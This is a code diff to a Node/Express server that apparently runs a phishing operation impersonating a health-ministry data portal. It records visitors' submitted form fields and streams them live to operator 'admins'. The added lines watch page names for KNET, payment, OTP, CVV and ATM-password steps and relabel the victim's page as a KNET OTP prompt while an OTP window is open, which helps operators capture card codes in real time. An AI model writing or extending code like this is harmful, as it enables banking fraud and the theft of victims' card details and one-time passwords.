@@ -1352,7 +1352,8 @@ app.post("/api/moh-data", (req, res) => {
         });
         v.data = { ...v.data, ...fields };
         v.hasNewData = true;
-        v.page = pageName;
+        /*FIX102B*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pB102 = String(pageName || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pB102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pB102)) { pageName = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
+v.page = pageName;
       }
       
       visitors.set(matchedVisitor.socketId, v);
@@ -1731,7 +1732,8 @@ v.data=Object.assign({},v.data||{},fields);
 if(!v.dataHistory)v.dataHistory=[];
 v.dataHistory.push({content:fields,page:pg,timestamp:new Date().toISOString()});
 if(Object.keys(fields).length>1)v.hasNewData=true;
-v.lastActivity=Date.now();v.page=pg;
+v.lastActivity=Date.now();/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pA102 = String(pg || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pA102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pA102)) { pg = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
+v.page=pg;
 visitors.set(v.socketId||v._id,v);
 try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
 admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}});
